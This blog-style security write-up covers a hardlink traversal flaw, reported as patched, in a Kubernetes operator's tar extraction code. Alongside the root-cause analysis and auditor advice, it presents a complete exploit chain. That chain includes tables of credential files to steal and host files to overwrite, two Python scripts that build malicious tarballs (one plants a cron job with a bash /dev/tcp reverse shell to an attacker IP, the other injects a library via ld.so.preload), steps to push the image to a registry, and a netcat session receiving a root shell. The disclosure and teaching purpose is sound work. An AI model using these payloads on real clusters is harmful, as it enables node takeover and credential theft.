---
title: "Escaping Kubernetes Operators: Hardlink Traversal and the ZipSlip Blind Spot"
date: 2026-04-12T12:00:00+03:00
draft: false
showToc: true
hideSummary: true
---

# Escaping Kubernetes Operators: Hardlink Traversal and the ZipSlip Blind Spot

**Note:** This vulnerability was independently discovered during a bug bounty engagement. Although it was ultimately marked as a duplicate, I am sharing this write-up due to its critical severity (CVSS 10.0) and to highlight the interesting technical mechanics of hardlink traversal in Kubernetes operators. The vulnerability has since been confirmed patched by the vendor.

Kubernetes operators run at a position of extraordinary trust. They typically execute as highly privileged DaemonSets, pulling external state like container images, configs, and agent binaries, then unpacking it directly onto host nodes so it can be mounted into user workloads. That makes the unpacking step a critical security boundary: if it's flawed, the operator becomes a confused deputy, faithfully writing files on behalf of an attacker.

During a recent audit of an enterprise Kubernetes operator, I found a critical path traversal vulnerability in its `.tar.gz` extraction logic. The interesting thing wasn't that security was ignored. It wasn't. The developers had written explicit, well-considered defenses against ZipSlip and symlink traversal. What they missed entirely was hardlinks.

By exploiting this omission, I was able to escalate from an unprivileged pod to full node compromise through arbitrary file overwrite. This post walks through the root cause, the two-phase exploit chain, and the fix.

---

## Background: What the Operator Does

The operator in question pulls a custom OCI image containing agent binaries, extracts the tar layer onto the host node, and mounts the result into user pods. Because it writes directly to host paths, it runs as root with host volume mounts. Exactly the environment you'd want to audit carefully.

---

## The Vulnerable File Location

The vulnerable extraction logic is located within the operator's codebase at:

**`pkg/injection/codemodule/installer/zip/gzip.go`**

---

## The Root Cause

The extraction code handled different tar entry types with separate functions. For symlinks, it routed through a well-written safe handler:

```go
func extractSymlink(targetDir, target string, header *tar.Header) error {
    if isSafeToSymlink(header.Linkname, targetDir, target) && isSafeToSymlink(header.Name, targetDir, target) {
        if err := os.Symlink(header.Linkname, target); err != nil {
            return errors.WithStack(err)
        }
    }
    return nil
}
```

`isSafeToSymlink` resolves the target path and verifies it stays within `targetDir`. Solid.

Just a few lines away, the hardlink handler (`tar.TypeLink`) looked like this:

```go
func extractLink(targetDir, target string, header *tar.Header) error {
    if err := os.Link(filepath.Join(targetDir, header.Linkname), target); err != nil {
        return errors.WithStack(err)
    }
    return nil
}
```

The **root cause** is the complete absence of boundary checks on attacker-controlled input before performing a privileged filesystem operation. Here is exactly how it breaks down:

1. **Attacker-Controlled Input:** `header.Linkname` comes directly from the untrusted tar archive.
2. **Dangerous Normalization:** The function passes this input to `filepath.Join(targetDir, header.Linkname)`. In Go, `filepath.Join` automatically collapses and normalizes `../` sequences.
3. **Blind Execution:** If an attacker provides a `Linkname` of `../../../../../../etc/crontab`, `filepath.Join` silently normalizes the resulting path to the absolute path `/etc/crontab`.
4. **Privileged Action:** The code then immediately calls `os.Link("/etc/crontab", target)` without verifying if the path escaped the intended sandbox. The OS, seeing a root process with the appropriate permissions, creates the hardlink without complaint.

---

## Exploitation Prerequisites

Before going further, one important constraint worth stating explicitly: **`os.Link` requires both the source and destination to reside on the same filesystem.** Calling it across filesystem boundaries fails with `EXDEV`.

This means the attack is most reliable when the operator extracts to a path on the root filesystem, something like `/var/lib/operator/...`, rather than a `tmpfs`-backed directory like `/tmp`. In the operator I audited, extractions went to `/var/lib/agent-data`, which shared a filesystem with `/etc`, `/usr`, and other critical paths. Verify this about your target before building a payload.

You can confirm filesystem layout from inside an unprivileged pod by reading `/proc/mounts` or running `findmnt` if it is available in the container image. What you are looking for is whether the operator's extraction directory and your target overwrite path share the same `st_dev` value, which you can verify with `stat` on any accessible path under each.

---

## Phase 1: Arbitrary File Read

### The Primitive

The path of least resistance is reading a sensitive file. The extraction directory eventually gets mounted into the user's unprivileged pod, so if I hardlink the kubelet's kubeconfig into it:
Linkname: ../../../../../../var/lib/kubelet/kubeconfig

...the operator links it into the extraction directory and hands it to my pod. A `cat` from inside the container gives me a `cluster-admin` token and full cluster takeover. Simple, but noisy and requires manual interaction.

### Why This Works at the Inode Level

It is worth being precise about what `os.Link` actually does here, because it is not copying the file. It is creating a new directory entry that points to an existing inode. After `os.Link("/var/lib/kubelet/kubeconfig", "/var/lib/agent-data/overwrite_target")` completes, both paths reference the same inode, the same block data, and the same permission bits. The file has not moved. No data has been duplicated. The extraction directory now simply contains a name that resolves to the kubelet credential file's underlying data.

Two implications worth noting for Phase 1 specifically:

1. **Read access is governed by the inode's permission bits, not the path.** If the kubelet kubeconfig is mode `0600 root:root` and your pod runs as an unprivileged UID, you will not be able to read it even through the hardlink. In practice, many credential files on Kubernetes nodes are world-readable or group-readable, but verify before assuming.

2. **The link survives operator cleanup.** If the operator deletes `overwrite_target` after mounting, it decrements the link count on the inode. The kubelet's original path still works fine. Your read window is while the mount is live.

### High-Value Targets for Phase 1

| Path | Contents |
|------|----------|
| `/var/lib/kubelet/kubeconfig` | cluster-admin bearer token |
| `/var/lib/kubelet/pki/kubelet-client-current.pem` | client TLS cert and key for node identity |
| `/etc/kubernetes/pki/ca.crt` | cluster CA cert (useful for validation) |
| `/proc/1/environ` | environment of PID 1, often contains secrets injected at node startup |
| `/root/.ssh/authorized_keys` | SSH access if the node has an SSH daemon |

---

## Phase 2: Upgrading to Arbitrary File Overwrite (RCE)

### The Core Mechanic

The more powerful exploit combines hardlink creation with a property of the tar format: **a single archive can contain multiple entries with the same filename**, and most extraction utilities will process them in sequence, with later entries overwriting earlier ones.

The payload uses exactly two entries:

1. **Entry 1 - The Trap:** A `LNKTYPE` hardlink named `overwrite_target`, with `Linkname` pointing to a critical host path.
2. **Entry 2 - The Payload:** A regular file, also named `overwrite_target`, containing a reverse shell command.

### Why `O_TRUNC` Is the Key

When the Go tar extractor writes a regular file entry (Entry 2), it opens the destination with `O_TRUNC | O_WRONLY | O_CREATE`. `O_TRUNC` instructs the kernel to truncate the file to zero bytes upon open, before any write occurs.

Critically, truncation operates on the **inode**, not on the path. The kernel resolves the path to an inode at open time, then the `O_TRUNC` flag zeroes the inode's data blocks. It does not matter that the path the extractor is opening (`/var/lib/agent-data/overwrite_target`) looks benign. Because we previously hardlinked it via Entry 1, the inode it resolves to is shared with the target host file. The host file is truncated and rewritten with our payload.

This is fundamentally different from a symlink attack, where the kernel follows the symlink to a new path and then checks permissions on that path. A hardlink is not a level of indirection. It is a second name for the same object. There is nothing to follow.

### A Note on Target File Existence

The target host file **must already exist** for this chain to work. `os.Link` fails with `ENOENT` if the source path does not exist, and the extraction loop will abort before ever reaching Entry 2. This is a critical constraint when selecting your overwrite target. Do not point `Linkname` at a path you intend to create. Point it at a path you know is already present on the node.

### Selecting an Overwrite Target

| Target | Effect | Notes |
|--------|--------|-------|
| `/etc/crontab` | RCE via cron | Present by default on Debian/Ubuntu/RHEL |
| `/etc/bash.bashrc` | Code exec on next interactive shell | Sourced system-wide; present on all Debian/Ubuntu nodes |
| `/etc/profile` | Code exec on next login shell | Present on virtually all Linux distributions |
| `/etc/ld.so.preload` | Library injection into every new process | Extremely powerful, but **not present by default** on most distributions, see variant note below |
| `/etc/passwd` | Add a root backdoor user | Works on nodes not using remote auth via PAM |
| `/root/.bashrc` or `/root/.profile` | Exec on next root interactive shell | Useful if node has SSH or console access |

---

## Proof of Concept

### The `ld.so.preload` Variant

> **Note:** `/etc/ld.so.preload` does not exist by default on standard Ubuntu, Debian, or RHEL distributions. If it is absent on your target node, `os.Link` will fail with `ENOENT` and the extraction loop will abort before reaching Entry 2. Confirm the file exists before using this variant. If targeting a Debian/Ubuntu node without it, overwriting `/etc/bash.bashrc` or `/etc/profile` is more reliable.

Where `/etc/ld.so.preload` does exist, this variant is the most powerful option. The dynamic linker reads this file whenever any dynamically linked binary is executed and loads the listed shared library into that process, giving you code execution on the next process launch rather than waiting on cron timing.

> **Prerequisite:** This script expects a compiled shared object named `payload.so` in the same directory. Compile a `.so` with a `__attribute__((constructor))` function containing your reverse shell before running this script, otherwise it will fail with `FileNotFoundError`.

```python
import tarfile
import io

OPERATOR_EXTRACT_PATH = "/var/lib/agent-data"
ATTACKER_IP = "192.168.1.100"  # Replace with your listener IP
ATTACKER_PORT = 4444

def generate_payload():
    with tarfile.open("payload.tar", "w") as tar:

        # Entry 1: drop the malicious .so into the extraction directory
        # Compile payload.so with a __attribute__((constructor)) reverse shell
        # before running this script, or it will throw FileNotFoundError
        so_bytes = open("payload.so", "rb").read()
        so_info = tarfile.TarInfo("payload.so")
        so_info.size = len(so_bytes)
        so_info.mode = 0o755
        tar.addfile(so_info, io.BytesIO(so_bytes))

        # Entry 2: hardlink trap pointing at /etc/ld.so.preload
        # Confirm this file exists on the target before using this variant
        link = tarfile.TarInfo("overwrite_target")
        link.type = tarfile.LNKTYPE
        link.linkname = "../../../../../../../../../../../etc/ld.so.preload"
        tar.addfile(link)

        # Entry 3: overwrite /etc/ld.so.preload with the path to our .so
        preload_data = f"{OPERATOR_EXTRACT_PATH}/payload.so\n".encode()
        payload = tarfile.TarInfo("overwrite_target")
        payload.size = len(preload_data)
        tar.addfile(payload, io.BytesIO(preload_data))

if __name__ == "__main__":
    generate_payload()
```

### The Basic Cron Exploit Script

```python
import tarfile
import io

# Replace with your listener IP and port before running
ATTACKER_IP = "192.168.1.100"
ATTACKER_PORT = 4444

def generate_payload():
    print("[*] Building malicious TarSlip payload...")
    with tarfile.open("payload.tar", "w") as tar:

        # Entry 1: The Trap
        # A hardlink pointing to the host's /etc/crontab (which exists by default
        # on Debian, Ubuntu, and RHEL-based nodes)
        link = tarfile.TarInfo("overwrite_target")
        link.type = tarfile.LNKTYPE
        link.linkname = "../../../../../../../../../../../etc/crontab"
        tar.addfile(link)

        # Entry 2: The Payload
        # A regular file with the exact same name. This triggers the O_TRUNC overwrite.
        data = f"* * * * * root bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'\n".encode()
        payload = tarfile.TarInfo("overwrite_target")
        payload.size = len(data)
        tar.addfile(payload, io.BytesIO(data))

    print("[+] payload.tar created successfully!")

if __name__ == "__main__":
    generate_payload()
```

### Execution and Packaging

Run the script to generate the payload:

```bash
$ python3 exploit.py
[*] Building malicious TarSlip payload...
[+] payload.tar created successfully!
```

Package the resulting tarball into an OCI image layer using a minimal Dockerfile:

```bash
$ cat << 'EOF' > Dockerfile
FROM scratch
ADD payload.tar /
EOF

$ docker build -t attacker-registry/malicious-image:latest .
$ docker push attacker-registry/malicious-image:latest
```

### Triggering the Operator

Apply the Custom Resource that commands the operator to pull and extract your malicious image. The specific CR will vary by target, but you are looking for any custom resource that exposes an image reference field, typically something like `spec.image` or `spec.codeModuleImage`, where the operator will pull and extract the referenced OCI image onto the host node.

```bash
$ kubectl apply -f trigger-operator.yaml
customresource.operator.io/exploit created
```

### Catching the Shell

Switch to a terminal with a netcat listener. Within 60 seconds, when the cron daemon fires on the underlying Kubernetes node, you will receive a root shell connection from the host.

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.100] from (UNKNOWN) [NODE_IP] 38192
root@k8s-worker-node-1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@k8s-worker-node-1:~# hostname
k8s-worker-node-1
```

You have successfully escalated from an unprivileged pod to a root shell directly on the Kubernetes node.

---

## Takeaways for Auditors

When reviewing archive extraction code, the standard checklist covers `../` in filenames (ZipSlip) and dangling symlinks. But tar archives are sequential byte streams that encode filesystem metadata including their own link semantics, which means stateful assumptions like "I already validated the name in entry 1" can break down silently. Both the **name** and the **linkname** of any entry are attacker-controlled and need independent validation.

A few things to check specifically:

- Does the code handle `tar.TypeLink` at all? Many implementations silently skip it, which is safer than handling it incorrectly.
- If it does handle hardlinks, does it apply the same bounds checking as symlinks?
- Does the extraction path share a filesystem with sensitive host paths? If so, and the extractor runs as root, a single missing bounds check is sufficient to compromise the node.

The gap here wasn't carelessness. It was a well-intentioned security review that mapped onto a mental model of "symlinks are the dangerous ones." Archive formats are complex enough that partial coverage is easy to miss. Explicit, type-by-type review is worth the extra time.